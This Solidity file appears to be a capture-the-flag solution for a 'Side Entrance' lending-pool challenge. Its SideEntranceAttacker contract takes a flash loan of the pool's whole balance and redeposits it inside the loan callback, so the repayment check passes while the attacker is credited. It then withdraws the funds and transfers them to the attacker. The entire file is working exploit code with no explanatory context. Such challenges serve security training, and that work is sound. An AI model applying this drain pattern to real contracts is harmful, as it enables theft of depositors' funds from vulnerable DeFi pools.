// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function withdraw() external;
    function deposit() external payable;
    function flashLoan(uint256 amount) external ;
}

contract SideEntranceAttacker {

    address payable attacker;
    uint256 poolBalance;
    ISideEntranceLenderPool pool;

    constructor() {}

    function attack(ISideEntranceLenderPool _pool, address payable _attacker) external {
        pool = _pool;
        poolBalance = address(pool).balance;
        attacker = _attacker;

        pool.flashLoan(poolBalance);

        pool.withdraw();

        attacker.transfer(poolBalance);
    }

    function execute() external payable {
        pool.deposit{value: poolBalance}();
    }

    receive() external payable {}
}
